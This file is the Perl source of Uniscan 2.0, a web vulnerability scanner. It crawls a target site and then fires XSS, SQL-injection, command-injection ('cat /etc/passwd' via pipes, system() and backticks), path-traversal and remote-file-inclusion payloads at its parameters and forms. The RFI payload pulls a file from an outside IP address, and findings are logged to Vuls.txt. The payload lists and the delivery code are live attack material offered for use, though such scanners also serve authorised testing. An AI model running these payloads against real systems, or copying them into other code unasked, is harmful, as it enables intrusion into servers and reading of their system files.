#!/usr/bin/perl

#################################################
# Uniscan project				#
# author: Douglas Poerschke Rocha		#
# visit: http://sourceforge.net/p/uniscan/	#
#################################################
use strict;
use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;
use threads;
use threads::shared;
use Thread::Queue;
use URI;

our $version;
our $timeout 	: shared;	# timeout 	=> time(in seconds)
our $variation 	: shared;	# variation 	=> maximum number of variations
our $max_size 	: shared;	# max_size 	=> maximum size in bytes of http request default: 1MB
our $max_threads: shared;	# max_threads 	=> maximum number of simultaneously active threads
our $max_reqs	: shared;	# max_reqs 	=> crawler maximum number of requests
our $try 	: shared;	#
our $cont 	: shared;	#
our $q 		: shared;	#
our $rfi_return	: shared;	# rfi_return => return of the base64 string of the hosted file for inclusion 
our $url 	: shared;	#
our $c		: shared;	#
our $extensions : shared;	# extensions => contains all the extensions that the scanner will ignore
our %files	: shared;	# hash with the found files
our %forms 	: shared;	# hash with the found forms
our @list 	: shared;	# arrray with the list of urls to try exploit
our %urls 	: shared;	# hash to check if a url has already been found (to avoid repetition)
our $u 		: shared;	#
our $p 		: shared;	#
our @xss	: shared;	#
our @rfi 	: shared;	#
our @sql	: shared;	#
our @lfi	: shared;	#
our @rce	: shared;	#
our $vulnerable : shared;	#
our @threads;

#############################
#  CONFIGURATION
#############################

$version	= 2.0;
$variation	= 2;
$timeout	= 10;
$c		= 0;
$rfi_return 	= "unipampascanunipampa"; 
$url  		= $ARGV[0];
$extensions 	= ".exe.pdf.xls.csv.mdb.rpm.deb.doc.jpg.jpeg.png.gif.bmp.tgz.gz.bz2.zip.rar.tar.asf.avi.bin.dll.fla.mp3.mpg.mov.ogg.ppt.rtf.scr.wav.msi";
$max_threads 	= 15;
$max_reqs	= 15000;
$max_size 	= 1048576;
$vulnerable	= 0;


@xss = (
	"<SCRIPT>alert('XSS')</SCRIPT>",
	"><SCRIPT>alert('XSS')</SCRIPT>",
	"\"><SCRIPT>alert('XSS')</SCRIPT>",
	"'><SCRIPT>alert('XSS')</SCRIPT>"
);
@sql = (
	"'",
	"\"",
	);

@rce = (
	'|cat%20/etc/passwd',
	'|cat%20/etc/passwd|',
	'|cat%20/etc/passwd%00|',
	'|cat%20/etc/passwd%00.html|',
	'|cat%20/etc/passwd%00.htm|',
	'|cat%20/etc/passwd%00.dat|',
	'system("cat%20/etc/passwd");',
	'.system("cat%20/etc/passwd").',
	':system("cat%20/etc/passwd");',
	';system("cat%20/etc/passwd").',
	';system("cat%20/etc/passwd")',
	';system("cat%20/etc/passwd");',
	':system("cat%20/etc/passwd").',
	'`cat%20/etc/passwd`',
	'`cat%20/etc/passwd`;'
);

@lfi = (
	'../../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../etc/passwd%00.jpg',
	'../../../../../../../../../../etc/passwd%00.html',
	'../../../../../../../../../../etc/passwd%00.css',
	'../../../../../../../../../../etc/passwd%00.php',
	'../../../../../../../../../../etc/passwd%00.txt',
	'../../../../../../../../../../etc/passwd%00.inc',
	'../../../../../../../../../../etc/passwd%00.png',
	'../../../../../../../../../../etc/passwd',
	'//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
	'//../../../../../../../../etc/passwd',
	'//../../../../../../../../etc/passwd%00',
	'//../../../../../../../../etc/passwd%00en',
	'//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
	'//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
	'//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
	'//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
	'//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
	'//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
	'//....................etc/passwd',
	'//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255..%255..%255cetc/passwd',
	'//%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd',
	'//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd',
	'//%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252eetc/passwd',
	'../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
	'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.',
	'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
	'/\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../etc/passwd',
	'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd%00',
	'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
	'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
	'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
	'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
	);

@rfi = (
	'http://200.132.146.43/c.txt?'
	);
$| = 1;

&banner();
&main();




################################
# 	SCANNER FUNCTIONS
################################




sub main(){

if(!$url || $url !~ /https?:\/\/.+\//){
	printf("Use: perl %s http://www.example.com/\n\n", $0);
	exit;
}



# crawler start
$q = new Thread::Queue;
$q->enqueue($url);

threads->new(\&crawling, $q->dequeue);
@threads = threads->list;
$u++;

while($q->pending() || scalar(@threads)){
		@threads = threads->list;
                if ($q->pending > 0) {
                        if  (scalar(@threads) < $max_threads-1) {
				if($p <= $max_reqs){
					printf("\rCrawling: %d% [%d - %d] Threads: %d \r", int(($p/$u)*100), $p, $u, scalar(threads->list));
					threads->new(\&crawling, $q->dequeue);

				}
				else{
					while($q->pending()){
						$q->dequeue;
					}
				}
                       } else {
                                foreach my $running (@threads) {
					printf("\rCrawling: %d% [%d - %d] Threads: %d \r", int(($p/$u)*100), $p, $u, scalar(threads->list));
					$running->join();
                                }
                        }
                } else {
			@threads = threads->list;
                        if (scalar(@threads)) {
                                foreach my $running (@threads) {
					printf("\rCrawling: %d% [%d - %d] Threads: %d \r", int(($p/$u)*100), $p, $u, scalar(threads->list));
                                        $running->join();
                                }
                        } 
                }

}

# crawler end

printf("Crawling finished, %d URL's found!    \n", scalar(@list));

@list = &mix(@list); 		# include the strings to try explore possible vulnerability
@list = &remove(@list); 	# remove duplicate tests

printf("GET method tests: %d\n",scalar(@list));
printf("Starting GET method tests.\n");

$p =0;
$u = $#list;


#test each element of url list
foreach my $teste (@list){
	$q->enqueue($teste); 
	$try++;
}

while ($q->pending() || scalar(@threads)) {
                @threads = threads->list;
                if ($q->pending > 0) {
                        if  (scalar(@threads) < $max_threads-1) {
				printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                threads->new(\&check_vul_get, $q->dequeue);
                                $cont++;
                        } else {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
					$running->join();
                                }
                        }
                } else {
			@threads = threads->list;
                        if (scalar(@threads)) {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                        $running->join();
                                }
                        } 
                }
        }

@threads = threads->list;
foreach my $running (@threads) {
	printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
	$running->join();
}


printf("GET method tests finished.        \n");
printf("starting POST method tests.\n");

#$q = new Thread::Queue;
$try = 0;
$cont = 0;

#test each found forms
foreach my $action (%forms)
{
	my $data = $forms{$action};
	foreach my $teste (@xss){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@sql){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@rfi){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@lfi){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@rce){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

}

while ($q->pending() || scalar(@threads)) { 
                @threads = threads->list;
                if ($q->pending > 0) {
                        if  (scalar(@threads) < $max_threads-1) {
				printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                threads->new(\&check_vul_post, $q->dequeue);
                                
				$cont++;
                        } else {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                        $running->join();
                                }
                        }
                } else {
			@threads = threads->list;
                        if (scalar(@threads)) {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                        $running->join();
                                }
                        } 
                }
        }

@threads = threads->list;
foreach my $running (@threads) {
	printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
	$running->join();
}

printf("POST method tests finished.    \n");
printf("Scanning finished. [%d] vulnerabilities found.\n", $vulnerable);
}

sub crawling(){
	my $l = shift;
	
	my @tmp = &get_urls($l);
	$p++;
	foreach my $t (@tmp){
		if(!$urls{$t}){
			push(@list, $t);
			$q->enqueue($t);
			$u++;
			$urls{$t} = 1;
		}
	}
	printf("\rCrawling: %d% [$p - $u] Threads: %d \r", int(($p/$u)*100), scalar(threads->list));
}


sub check_vul_get(){
	my $url1 = shift;
	my $res = &get_http($url1);

	#check LFI and RCE Vuls
	if($res =~/root:x:0:0:root/){
		$vulnerable++;
		printf("[%d] [LFI] Vul: %s\n",$vulnerable, $url1) if($url1 =~/%2e|..\// && $url1 !~/cat%20\/etc\/passwd/);
		printf("[%d] [RCE] Vul: %s\n",$vulnerable, $url1) if($url1 =~/cat%20\/etc\/passwd/);
		&grava("Vuls.txt", $url1);
	}

	#check FRI vuln
	if($res =~/$rfi_return/){
		$vulnerable++;
		printf("[%d] [RFI] Vul: %s\n",$vulnerable, $url1);
		&grava("Vuls.txt", $url1);
	}

	#check SQL-i Vuln
	if(($res =~/You have an error in your SQL syntax/ || $res =~/Microsoft OLE DB Provider for ODBC Drivers error/ || $res =~/Supplied argument is not a valid .* result/ || $res =~/Unclosed quotation mark after the character string/) && $url1 =~/'|"/ && $url1 !~/etc\/passwd|<SCRIPT>/){
		$vulnerable++;
		printf("[%d] [SQL-i] Vul: %s\n",$vulnerable, $url1);
		&grava("Vuls.txt", $url1);
	}

	#check XSS
	if(($res =~/<SCRIPT>alert\('XSS'\)<\/SCRIPT>/) && $url1 =~/<SCRIPT>/){
		$vulnerable++;
		printf("[%d] [XSS] Vul: %s\n\n",$vulnerable, $url1);
		&grava("Vuls.txt", $url1);
	}
}


sub check_vul_post(){
	my ($action, $data)  = split('#', shift);
	my $res	   = &post_http($action, $data);
	if($res =~/root:x:0:0:root/){
		$vulnerable++;
		printf("[%d] [LFI] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data) if($data =~/%2e|..\// && $data !~/cat%20\/etc\/passwd/);
		printf("[%d] [RCE] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data) if($data =~/cat%20\/etc\/passwd/);
		&grava("Vuls.txt", ($action, "POST data: " .$data));
	}

	if($res =~/$rfi_return/){
		$vulnerable++;
		printf("[%d] [RFI] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
		&grava("Vuls.txt", ($action, "POST data: " .$data));
	}

	if(($res =~/You have an error in your SQL syntax/ || $res =~/Microsoft OLE DB Provider for ODBC Drivers error/ || $res =~/Supplied argument is not a valid .* result/ || $res =~/Unclosed quotation mark after the character string/) && $data =~/'|"/ && $data !~/etc\/passwd|<SCRIPT>/){
		$vulnerable++;
		printf("[%d] [SQL-i] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
		&grava("Vuls.txt", ($action, "POST data: " .$data));
	}

	#check XSS
	if(($res =~/<SCRIPT>alert\('XSS'\)<\/SCRIPT>/) && $data =~/<SCRIPT>/){
		$vulnerable++;
		printf("[%d] [XSS] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
		&grava("Vuls.txt", ($action, "POST data: " .$data));
	}

}


sub mix(){
	my @list = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				foreach my $str (@sql){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
				foreach my $str (@rfi){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
				foreach my $str (@lfi){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
				foreach my $str (@rce){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}

			}
		}
	}
	@list = ();
	return(@list2);
}


sub add_form(){
	my $site = $_[0];
	my $content = $_[1];
	my @form = ();
	my $url2;
	my @inputs = &get_input($content);
	$content =~/<form.*action=\"(.*?)\".*>/i;
	$form[0] = $1;
	if(length($form[0]) <1){
		$form[0] = &get_file($site);
	}

	$content =~/<form.*method=\"(.*?)\".*>/i;
	$form[1] = $1;	

	if($form[1] =~/get/i){
		if($form[0] !~ /^https?:\/\//){
			
			if($form[0] =~/^\//){
			substr($form[0], 0, 1) = "";
			}
			$url2 = $url.$form[0].'?';
		}
		else{
			$url2 = $form[0] . '?';
		}
		foreach my $var (@inputs){
			$url2 .= '&'.$var .'=123';
		}
		
		my $fil = &get_file($url2);
		my $ext = &get_extension($fil);
		if($extensions !~/$ext/){
			$files{$fil}++;
			if($files{$fil} <= $variation){
				if($url2 =~/$url/){
					push(@list, $url2);
				}
			}
		}
	}
	else{
		if($form[0] !~ /https?:\/\//){
			$form[0] = $url.$form[0];
		}
		my $data;
		foreach my $var (@inputs){
			$data .='&'.$var.'=123';
		}
		if(!$forms{$form[0]}){
			$forms{$form[0]} = $data;
		}

	}
}


sub get_input(){
	my $content = shift;
	my @input = ();
	while ($content =~  m/<input.*name=\"(.+?)\".*>/gi){
		push(@input, $1);
	}
	while ($content =~  m/<input.*name=\'(.+?)\'.*>/gi){
		push(@input, $1);
	}
	return @input;
}


sub get_http(){
    	my $url1 = shift;
    	my $req=HTTP::Request->new(GET=>$url1);
    	my $ua=LWP::UserAgent->new(agent => "Uniscan/". $version . " http://sourceforge.net/p/uniscan/");
    	$ua->timeout($timeout);
	$ua->max_size($max_size);
    	my $response=$ua->request($req);
    	return $response->content;
}


sub post_http(){
	my $url1 = $_[0];
	my $data = $_[1];
	$data =~ s/\r//g;
    	my $headers = HTTP::Headers->new();
    	my $request= HTTP::Request->new("POST", $url1, $headers);
    	$request->content($data);
    	$request->content_type('application/x-www-form-urlencoded');
    	my $ua=LWP::UserAgent->new(agent => "Uniscan/". $version . " http://sourceforge.net/p/uniscan/");
    	$ua->timeout($timeout);
	$ua->max_size($max_size);
	my $response=$ua->request($request);
	return $response->content;
}


sub get_urls()
{
    	my $base = shift;
    	my @lst = ();
	my @ERs = (	"href=\"(.+)\"", 
			"href='(.+)'", 
			"location.href='(.+)'",
			"src='(.+)'",
			"src=\"(.+)\"",
			"location.href=\"(.+)\"", 
			"<meta.*content=\"?.*;URL=(.+)\"?.*?>"
		);
				
    	my $result = &get_http($base);
	if($result =~ /<form/i){
		&add_form($base, $result);
	}
    	if($result){
		chomp($result);
		foreach my $er (@ERs){
			while ($result =~  m/$er/gi)
			{
				my $link = $1;
				if ($link =~/"/){
					$link = substr($link,0,index($link, '"'));
				}
				if ($link =~/'/){
					$link = substr($link,0,index($link, "'"));
				}
				
				if($link !~/^http:\/\// && $link !~/http:\/\// && $link !~/:/){
					if($link =~/^\//){
						substr($link,0,1) = "";
					}
					$link = $url . $link;
				}
				chomp $link;
				$link =~s/&amp;/&/g;
		 
				if($link =~/^https?:\/\// && $link =~/^$url/ && $link !~/#|javascript:|mailto:/){
					my $fil = &get_file($link);
					my $ext = &get_extension($fil);
					if($extensions !~/$ext/){
						$files{$fil}++;
						if($files{$fil} <= $variation){
							push (@lst,$link);
						}
					}
				}
			}
		}
	}
    	return @lst;
}



sub banner(){
	printf("###############################\n# Uniscan by poerschke        #\n###############################\nV. %.1f\n\n", $version);
}

sub host(){
  	my $h = shift;
  	my $url1 = URI->new( $h || return -1 );
  	return $url1->host();
}


sub get_file(){
	my $url1 = shift;
	substr($url1,0,7) = "" if($url1 =~/http:\/\//);
	substr($url1,0,8) = "" if($url1 =~/https:\/\//);
	$url1 = substr($url1, index($url1, '/'), length($url1));
	if($url1 =~/\?/){
		$url1 = substr($url1, 0, index($url1, '?'));
	}
	return $url1;
}


sub grava(){
	my ($filtxt, @content) = @_;
	open(my $a, ">>$filtxt");
	foreach(@content){
		print $a "$_\n";
	}
	close($a);
}

sub get_extension(){
	my $file = shift;
	if($file =~/\./){
		my $ext = substr($file, rindex($file, '.'), length($file));
		$ext =~ s/ //g;
		if($ext !~/\(|\)|\-|\//){
			return $ext;
		}
		else {
			return 0;
		}
	}
	else{
		return 0;
	}
}

sub remove{
   	my @si = @_;
   	my @novo = ();
   	my %ss;
   	foreach my $s (@si)
   	{
        	if (!$ss{$s})
        	{
            		push(@novo, $s);
            		$ss {$s} = 1;
        	}
    	}
    	return (@novo);
}

